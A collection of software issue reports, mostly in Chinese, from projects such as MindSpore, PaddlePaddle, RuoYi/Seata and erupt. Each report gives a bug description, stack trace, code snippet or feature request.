[CT][MS][generate]unique+stack core dump on GPU,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python uns.py [ERROR] KERNEL(57294,7fca55fff700,python):2021-11-09-09:44:26.568.567 [mindspore/ccsrc/backend/kernel_compiler/gpu/gpu_kernel.h:84] ResetResource] kernel must override the method when dynamic shape [CRITICAL] RUNTIME_FRAMEWORK(57294,7fca55fff700,python):2021-11-09-09:44:26.568.755 [mindspore/ccsrc/runtime/framework/actor/kernel_actor.cc:328] FetchOutputDeviceTensor] The outputs number is not equal. terminate called after throwing an instance of 'std::runtime_error' what(): mindspore/ccsrc/runtime/framework/actor/kernel_actor.cc:328 FetchOutputDeviceTensor] The outputs number is not equal. Aborted (core dumped) pass   <code>: from mindspore import Tensor, dtype from mindspore.nn import Cell import mindspore.ops.operations as P from mindspore.ops.functional import grad import mindspore.numpy as np from mindspore import context #context.set_context(mode=context.PYNATIVE_MODE) input0 = np.ones([9], dtype.float32) input1 = np.ones([5], dtype.float32) class Net(Cell): def __init__(self): super().__init__() self.unique00 = P.Unique() self.stack11 = P.Stack() def construct(self, input0, input1): unique00_output, unique00_output1 = self.unique00(input1) stack11_output = self.stack11([unique00_output, unique00_output]) return stack11_output net = Net() out = net(input0, input1) print(out) ResetResource()"
Need to refine the inference example recognize_digits,"Image pixels in are normalized to [-1, 1], so that the input data of inference should be in the range [-1, 1].   <code>: paddle.dataset.mnist"
SIGSEGV  ERROR during training,"This error occurs when traing a LSTM model. I added an attention layer to this model, which is calculated as weight of tokens in the sequence. I guess there is something wrong with this layer, but I don't know what's the problem. The related code is below. This is the error info: This is the code of attention layer   <code>: Thread [139810164651776] Forwarding __expand_layer_0__, *** Aborted at 1521533628 (unix time) try ""date -d @1521533628"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGSEGV (@0x30) received by PID 16264 (TID 0x7f2817333700) from PID 48; stack trace: *** @ 0x7f28594c3160 (unknown) @ 0x7f27f63eac79 paddle::ExpandLayer::forward() @ 0x7f27f645b19d paddle::NeuralNetwork::forward() @ 0x7f27f647c984 paddle::TrainerThread::forward() @ 0x7f27f647dbe5 paddle::TrainerThread::computeThread() @ 0x7f284b6d68a0 execute_native_thread_routine @ 0x7f28594bb1c3 start_thread @ 0x7f2858ae312d __clone @ 0x0 (unknown) local.sh: line 5: 16264 段错误 (core dumped) python bin/train.py --conf_path=conf/slot_filling.local.conf attention_weight_layer = get_position_aware_attention(raw_lstm_layer, emb_dim_dict, \ attention_dim, position_input_size) attention_weight_seq_layer = paddle.layer.repeat(input=attention_weight_layer, \ num_repeats=raw_lstm_layer.size, as_row_vector=False) weighted_lstm_layer = paddle.layer.dot_prod( input1=raw_lstm_layer, input2=attention_weight_seq_layer) hidden_layer = paddle.layer.fc( size=hidden_dim, bias_attr=paddle.attr.Param(initial_std=default_std), input = weighted_lstm_layer, param_attr = fc_para_attr) #获取attention层 def get_position_aware_attention(lstm_layer, emb_dim_dict, attention_dim, \ position_input_size): position_data = paddle.layer.data(name='position_data', \ type=paddle.data_type.dense_vector_sequence(position_input_size)) position_emb_layer = get_embedding_layer(position_data, 'position', emb_dim_dict)` lstm_sum = paddle.layer.addto( input=paddle.layer.seq_slice(input=lstm_layer, starts=paddle.layer.first_seq(input=lstm_layer), ends=None), bias_attr=False) lstm_sum_expand = paddle.layer.expand(input=lstm_sum, expand_as=lstm_layer, expand_level=paddle.layer.ExpandLevel.FROM_SEQUENCE)` attention_input_seq = [] attention_input_seq.append( paddle.layer.fc( input=lstm_sum_expand, size=attention_dim, act=paddle.activation.Linear(), bias_attr=False)) attention_input_seq.append( paddle.layer.fc( input=lstm_layer, size=attention_dim, act=paddle.activation.Linear(), bias_attr=False)) attention_input_seq.append( paddle.layer.fc( input=position_emb_layer, size=attention_dim, act=paddle.activation.Linear(), bias_attr=False)) attention_input_sum = paddle.layer.addto(input=attention_input_seq) raw_weight = paddle.layer.fc(input=attention_input_sum, size=1) normalized_weight = paddle.layer.fc(input=raw_weight, size=1, act=paddle.activation.SequenceSoftmax()) return normalized_weight`"
如何在微服务demo项目里引用pigx的MobileService？,pigx版本: 3.4.0 是否修改包名: 否   <code>: 1.想在demo项目里调用pigx的MobileService服务实现发送短信验证码的功能； 2.在demo-biz项目里的pom.xml加入依赖： &lt;dependency&gt; &lt;groupId&gt;com.pig4cloud&lt;/groupId&gt; &lt;artifactId&gt;pigx-upms-biz&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;/dependency&gt; 3.在DemoController里无法引用MobileService，如下图所示。 Cannot resolve symbol 'service'
Seata-用Postman模拟正常下单报错,"按照（http://doc.ruoyi.vip/ruoyi-cloud/cloud/seata.html#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81）教程示例，测试seata，项目都启动了 正常下单 用Postman模拟正常下单，买一个商品 http://localhost:9201/order/placeOrder 报错，麻烦看一下。   <code>: 2021-07-15 14:32:37 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [i.s.t.TransactionManagerHolder.&lt;clinit&gt;:40] :TransactionManager Singleton io.seata.tm.DefaultTransactionManager@1ba8b18d 2021-07-15 14:32:37 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [i.s.t.a.DefaultGlobalTransaction.begin:108] :Begin new global transaction [172.168.170.50:8091:3873250862892437548] 2021-07-15 14:32:37 WARN [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.a.d.p.DruidAbstractDataSource.testConnectionInternal:1494] :discard long time none received connection. , jdbcUrl : jdbc:mysql://localhost:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8, version : 1.2.5, lastPacketReceivedIdleMillis : 936762 2021-07-15 14:32:37 WARN [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.a.d.p.DruidAbstractDataSource.testConnectionInternal:1494] :discard long time none received connection. , jdbcUrl : jdbc:mysql://localhost:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8, version : 1.2.5, lastPacketReceivedIdleMillis : 936899 2021-07-15 14:32:37 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.impl.OrderServiceImpl.placeOrder:40] :=============ORDER START================= 2021-07-15 14:32:37 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.impl.OrderServiceImpl.placeOrder:44] :收到下单请求,用户:1, 商品:1,数量:1 2021-07-15 14:32:37 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.impl.OrderServiceImpl.placeOrder:46] :当前 XID: 172.168.170.50:8091:3873250862892437548 2021-07-15 14:32:38 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.impl.OrderServiceImpl.placeOrder:51] :订单一阶段生成，等待扣库存付款中 2021-07-15 14:32:38 WARN [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.a.d.p.DruidAbstractDataSource.testConnectionInternal:1494] :discard long time none received connection. , jdbcUrl : jdbc:mysql://localhost:3306/seata_product?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8, version : 1.2.5, lastPacketReceivedIdleMillis : 937441 2021-07-15 14:32:38 WARN [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.a.d.p.DruidAbstractDataSource.testConnectionInternal:1494] :discard long time none received connection. , jdbcUrl : jdbc:mysql://localhost:3306/seata_product?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8, version : 1.2.5, lastPacketReceivedIdleMillis : 937475 2021-07-15 14:32:38 WARN [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.a.d.p.DruidAbstractDataSource.testConnectionInternal:1494] :discard long time none received connection. , jdbcUrl : jdbc:mysql://localhost:3306/seata_product?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8, version : 1.2.5, lastPacketReceivedIdleMillis : 937504 2021-07-15 14:32:38 WARN [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.a.d.p.DruidAbstractDataSource.testConnectionInternal:1494] :discard long time none received connection. , jdbcUrl : jdbc:mysql://localhost:3306/seata_product?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8, version : 1.2.5, lastPacketReceivedIdleMillis : 937528 2021-07-15 14:32:38 WARN [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.a.d.p.DruidAbstractDataSource.testConnectionInternal:1494] :discard long time none received connection. , jdbcUrl : jdbc:mysql://localhost:3306/seata_product?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8, version : 1.2.5, lastPacketReceivedIdleMillis : 937566 2021-07-15 14:32:38 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.i.ProductServiceImpl.reduceStock:32] :=============PRODUCT START================= 2021-07-15 14:32:38 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.i.ProductServiceImpl.reduceStock:33] :当前 XID: 172.168.170.50:8091:3873250862892437548 2021-07-15 14:32:38 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.i.ProductServiceImpl.reduceStock:38] :商品编号为 1 的库存为20,订单商品数量为1 2021-07-15 14:32:38 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.i.ProductServiceImpl.reduceStock:45] :开始扣减商品编号为 1 库存,单价商品价格为10.0 2021-07-15 14:32:38 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.i.ProductServiceImpl.reduceStock:51] :扣减商品编号为 1 库存成功,扣减后库存为19, 1 件商品总价为 10.0 2021-07-15 14:32:38 INFO [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [c.r.s.s.i.ProductServiceImpl.reduceStock:53] :=============PRODUCT END================= 2021-07-15 14:32:39 ERROR [APP_NAME_IS_UNDEFINED,,,] 10311 --- [ http-nio-9201-exec-7] [i.s.r.d.u.p.JacksonUndoLogParser.encode:127] :json encode exception, Type id handling not implemented for type java.lang.Object (by serializer of type com.fasterxml.jackson.databind.ser.impl.UnsupportedTypeSerializer) (through reference chain: io.seata.rm.datasource.undo.BranchUndoLog[""sqlUndoLogs""]-&gt;java.util.ArrayList[0]-&gt;io.seata.rm.datasource.undo.SQLUndoLog[""beforeImage""]-&gt;io.seata.rm.datasource.sql.struct.TableRecords[""rows""]-&gt;java.util.ArrayList[0]-&gt;io.seata.rm.datasource.sql.struct.Row[""fields""]-&gt;java.util.ArrayList[3]-&gt;io.seata.rm.datasource.sql.struct.Field[""value""]) com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Type id handling not implemented for type java.lang.Object (by serializer of type com.fasterxml.jackson.databind.ser.impl.UnsupportedTypeSerializer) (through reference chain: io.seata.rm.datasource.undo.BranchUndoLog[""sqlUndoLogs""]-&gt;java.util.ArrayList[0]-&gt;io.seata.rm.datasource.undo.SQLUndoLog[""beforeImage""]-&gt;io.seata.rm.datasource.sql.struct.TableRecords[""rows""]-&gt;java.util.ArrayList[0]-&gt;io.seata.rm.datasource.sql.struct.Row[""fields""]-&gt;java.util.ArrayList[3]-&gt;io.seata.rm.datasource.sql.struct.Field[""value""]) at com.fasterxml.jackson.databind.exc.InvalidDefinitionException.from(InvalidDefinitionException.java:77) at com.fasterxml.jackson.databind.SerializerProvider.reportBadDefinition(SerializerProvider.java:1276) at com.fasterxml.jackson.databind.DatabindContext.reportBadDefinition(DatabindContext.java:400) at com.fasterxml.jackson.databind.JsonSerializer.serializeWithType(JsonSerializer.java:160) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:730) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:770) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeWithType(BeanSerializerBase.java:655) at com.fasterxml.jackson.databind.ser.std.CollectionSerializer.serializeContents(CollectionSerializer.java:147) at com.fasterxml.jackson.databind.ser.std.CollectionSerializer.serializeContents(CollectionSerializer.java:25) at com.fasterxml.jackson.databind.ser.std.AsArraySerializerBase.serializeWithType(AsArraySerializerBase.java:267) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:730) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:770) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeWithType(BeanSerializerBase.java:655) at com.fasterxml.jackson.databind.ser.std.CollectionSerializer.serializeContents(CollectionSerializer.java:147) at com.fasterxml.jackson.databind.ser.std.CollectionSerializer.serializeContents(CollectionSerializer.java:25) at com.fasterxml.jackson.databind.ser.std.AsArraySerializerBase.serializeWithType(AsArraySerializerBase.java:267) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:730) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:770) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeWithType(BeanSerializerBase.java:655) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:730) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:770) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeWithType(BeanSerializerBase.java:655) at com.fasterxml.jackson.databind.ser.std.CollectionSerializer.serializeContents(CollectionSerializer.java:147) at com.fasterxml.jackson.databind.ser.std.CollectionSerializer.serializeContents(CollectionSerializer.java:25) at com.fasterxml.jackson.databind.ser.std.AsArraySerializerBase.serializeWithType(AsArraySerializerBase.java:267) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:730) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:770) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeWithType(BeanSerializerBase.java:655) at com.fasterxml.jackson.databind.ser.impl.TypeWrappedSerializer.serialize(TypeWrappedSerializer.java:32) at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider._serialize(DefaultSerializerProvider.java:480) at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider.serializeValue(DefaultSerializerProvider.java:319) at com.fasterxml.jackson.databind.ObjectMapper._writeValueAndClose(ObjectMapper.java:4487) at com.fasterxml.jackson.databind.ObjectMapper.writeValueAsBytes(ObjectMapper.java:3765) at io.seata.rm.datasource.undo.parser.JacksonUndoLogParser.encode(JacksonUndoLogParser.java:125) at io.seata.rm.datasource.undo.AbstractUndoLogManager.flushUndoLogs(AbstractUndoLogManager.java:214) at io.seata.rm.datasource.ConnectionProxy.processGlobalTransactionCommit(ConnectionProxy.java:221) at io.seata.rm.datasource.ConnectionProxy.doCommit(ConnectionProxy.java:196) at io.seata.rm.datasource.ConnectionProxy.lambda$commit$0(ConnectionProxy.java:184) at io.seata.rm.datasource.ConnectionProxy$LockRetryPolicy.execute(ConnectionProxy.java:289) at io.seata.rm.datasource.ConnectionProxy.commit(ConnectionProxy.java:183) at org.springframework.jdbc.datasource.DataSourceTransactionManager.doCommit(DataSourceTransactionManager.java:333) at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:743) at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:711) at org.springframework.transaction.interceptor.TransactionAspectSupport.commitTransactionAfterReturning(TransactionAspectSupport.java:654) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:407) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at com.baomidou.dynamic.datasource.aop.DynamicDataSourceAnnotationInterceptor.invoke(DynamicDataSourceAnnotationInterceptor.java:50) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) at com.ruoyi.system.service.impl.ProductServiceImpl$$EnhancerBySpringCGLIB$$23109f76.reduceStock(&lt;generated&gt;) at com.ruoyi.system.service.impl.OrderServiceImpl.placeOrder(OrderServiceImpl.java:53) at com.ruoyi.system.service.impl.OrderServiceImpl$$FastClassBySpringCGLIB$$63a9191c.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:388) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at com.baomidou.dynamic.datasource.aop.DynamicDataSourceAnnotationInterceptor.invoke(DynamicDataSourceAnnotationInterceptor.java:50) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at io.seata.spring.annotation.GlobalTransactionalInterceptor$1.execute(GlobalTransactionalInterceptor.java:150) at io.seata.tm.api.TransactionalTemplate.execute(TransactionalTemplate.java:104) at io.seata.spring.annotation.GlobalTransactionalInterceptor.handleGlobalTransaction(GlobalTransactionalInterceptor.java:147) at io.seata.spring.annotation.GlobalTransactionalInterceptor.invoke(GlobalTransactionalInterceptor.java:122) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) at com.ruoyi.system.service.impl.OrderServiceImpl$$EnhancerBySpringCGLIB$$d58ee899.placeOrder(&lt;generated&gt;) at com.ruoyi.system.controller.OrderController.placeOrder(OrderController.java:23) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1063) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)"
多GPU出现nan及Reduce策略出错,"1）PaddlePaddle版本：1.5 2）GPU：预测若用GPU，GPU：K40m，Cuda9.0，cuDNN7.3，nccl_2.2.12-1 3）系统环境：CentOS6.3， Python2.7 训练信息 1）单机多卡，多CPU 问题描述： 1） 程序在单机单GPU【或单CPU】能正常运行 2）在使用多CPU或多GPU时，设置使用Reduce策略，出现报错信息如下图一所示 3）使用多GPU，ALLReduce策略，训练几个batch后，loss出现nan，而使用单GPU或多CPU无此问题。 上述问题代码复现如下： Reduce策略错误信息：   <code>: git clone https://github.com/Bond-SYSU/models.git cd models/PaddleNLP/lexical_analysis sh run_new.sh train # 多GPU, ALLReduce策略"
建议增加方法延迟调用方式,"能否增加一个延迟任务工具类，用于执行延迟的操作   <code>: private static ScheduledThreadPoolExecutor executor = new ScheduledThreadPoolExecutor(1, r -&gt; new Thread(r, ""schedule-gasStatCache""), new ThreadPoolExecutor.AbortPolicy() ); something(){ 业务代码，，，，，， executor.schedule(() -&gt; init(),10, TimeUnit.SECONDS); }"
@FetchMany bug,"采用@FetchMany 自动获取pojo时，@FetchMany会自动将 UpdateTime 字段作为条件进行查询，导致不能正常获取数据； 隐射关系: Address： 自动生成SQL如下：   <code>: User： @FetchMany(""userId"") private List&lt;Address&gt; addresses; private Integer userId; @UpdateTime private Date lastModified; select * from t_address where 1=1 and user_id = ? and last_modified = ? ┣ 参数： [1, 2020-10-12 (12:44:14.867)]"
建议crud组件增加个将表单按钮固定在底部的配置,"现有的crud组件，当时，默认是将的滚动高度为,能不能加个配置项，将表单新增，编辑的新增、编辑、取消按钮固定在底部，然后再动态计算滚动高度，如果担心使用者用插槽设置自定义menuForm的按钮，可以再加个配置让用户自己设置。 还有在firefox上，现有的crud组件，抽屉弹窗滚动体是有问题的   <code>: dialogType:'drawer' el-scrollbar calc(100% - 100px) .avue-dialog .el-drawer__body { padding: 30px 10px; overflow: hidden; }"
jbc2mpl eh issue: jump into middle of a try block,"We should not allow jump into middle of a try block. Might split it into two try blocks. for a function jbc2mpl generated from OpenJDK 8 jar file   <code>: func &amp;Lsun_2Fnet_2Fwww_2Fhttp_2FKeepAliveStreamCleaner_3B_7Crun_7C_28_29V try { @label179739 } #INSTIDX : 78||004e: goto goto @label179727 endtry try { @label179739 } #INSTIDX : 85||0055: aload 11 #INSTIDX : 87||0057: athrow throw (dread ref %Reg14_R20209) @label179727 #INSTIDX : 88||0058: aload_1 #INSTIDX : 89||0059: ifnonnull brtrue @label179728 (ne i32 ref (dread ref %Reg4_R12, constval ref 0)) endtry"
【众智】【计算-AICPU接入】SparseAdd,AICPU算子接入 两个SparseTensor对象相加。 接口目录：mindspore/ops/operations/sparse_ops.py x1_indices x1_values x1_shape x2_indices x2_values x2_shape thresh sum_indices sum_values sum_shape 对应底层算子 对应底层AI CPU算子SparseAdd 标杆接口参考 TF接口： tf.raw_ops.SparseAdd https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseAdd 3. 异常处理 4. 算子反向 反向接入SparseAddGrad   <code>: class SparseAdd(Primitive):
selectConfigByKey中Cacheable的设置,"如果这样编写selectConfigById数据会从缓存中读，我想要selectConfigByKey实现中从缓存中读，进行如下操作 1。去掉selectConfigById的CacheCable 2。将updateConfig中的key改为#config.configKey 每次调用selectConfigByKey都会从数据库中读。请问应该如何改？   <code>: @Override @Cacheable(cacheNames = ""config"", key = ""#configId"") public SysConfig selectConfigById(Long configId) { SysConfig config = new SysConfig(); config.setConfigId(configId); return configMapper.selectConfig(config); } @CachePut(cacheNames = ""config"", key = ""#config.configId"") @Override public SysConfig updateConfig(SysConfig config) { configMapper.updateConfig(config); return config; } @Override @Cacheable(cacheNames = ""config"", key = ""#configKey"") public SysConfig selectConfigByKey(String configKey) { SysConfig config = new SysConfig(); config.setConfigKey(configKey); SysConfig retConfig = configMapper.selectConfig(config); //return StringUtils.isNotNull(retConfig) ? retConfig.getConfigValue() : """"; return retConfig; }"
Use the sequence_conv_pool define inside the networks.py,主要是引用networks里面的sequence_conv_pool，避免在demo里面自己定义sequence_conv_pool。 另外，与其他demo风格保持一致，只   <code>: import paddle.v2 as paddle
ViewType注解中ATTACHMENT的Comment出现单词拼写错误,"JDK版本： oraclejdk_8_321 erupt版本： 1.10.8 枚举值上面的的中，误拼写成了。   <code>: ATTACHMENT @Comment value mime mine package xyz.erupt.annotation.sub_field; import xyz.erupt.annotation.config.Comment; /** * @author YuePeng * date 2018-11-12. */ public enum ViewType { // ... // 省略无关代码 @Comment(""在新标签页中查看，不同于下载，特殊mine类型可以在网页中直接预览，如：pdf,mp4,svg,png等"") ATTACHMENT, // mine -&gt; mime // ... // 省略无关代码 }"
